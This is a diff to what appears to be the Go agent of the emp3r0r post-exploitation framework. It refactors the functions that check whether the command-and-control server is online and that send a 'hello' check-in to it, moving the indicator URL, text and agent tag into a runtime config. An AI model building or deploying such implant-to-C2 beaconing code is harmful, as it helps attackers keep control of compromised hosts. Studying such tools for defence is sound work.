@@ -42,7 +42,7 @@ func CheckIn() error {
 	return nil
 }
 
-// IsCCOnline check emp3r0r_data.CCIndicator
+// IsCCOnline check RuntimeConfig.CCIndicator
 func IsCCOnline(proxy string) bool {
 	t := &http.Transport{
 		Dial: (&net.Dialer{
@@ -64,20 +64,20 @@ func IsCCOnline(proxy string) bool {
 		Transport: t,
 		Timeout:   30 * time.Second,
 	}
-	resp, err := client.Get(emp3r0r_data.CCIndicator)
+	resp, err := client.Get(RuntimeConfig.CCIndicator)
 	if err != nil {
-		log.Printf("IsCCOnline: %s: %v", emp3r0r_data.CCIndicator, err)
+		log.Printf("IsCCOnline: %s: %v", RuntimeConfig.CCIndicator, err)
 		return false
 	}
 	data, err := ioutil.ReadAll(resp.Body)
 	if err != nil {
-		log.Printf("IsCCOnline: %s: %v", emp3r0r_data.CCIndicator, err)
+		log.Printf("IsCCOnline: %s: %v", RuntimeConfig.CCIndicator, err)
 		return false
 	}
 	defer resp.Body.Close()
 
-	log.Printf("Checking CCIndicator (%s) for %s", emp3r0r_data.CCIndicator, strconv.Quote(emp3r0r_data.CCIndicatorText))
-	return strings.Contains(string(data), emp3r0r_data.CCIndicatorText)
+	log.Printf("Checking CCIndicator (%s) for %s", RuntimeConfig.CCIndicator, strconv.Quote(RuntimeConfig.CCIndicatorText))
+	return strings.Contains(string(data), RuntimeConfig.CCIndicatorText)
 }
 
 func catchInterruptAndExit(cancel context.CancelFunc) {
@@ -161,7 +161,7 @@ func CCMsgTun(ctx context.Context, cancel context.CancelFunc) (err error) {
 
 			// send hello
 			msg.Payload = "hello"
-			msg.Tag = emp3r0r_data.AgentTag
+			msg.Tag = RuntimeConfig.AgentTag
 			err = out.Encode(msg)
 			if err != nil {
 				log.Printf("agent cannot connect to cc: %v", err)
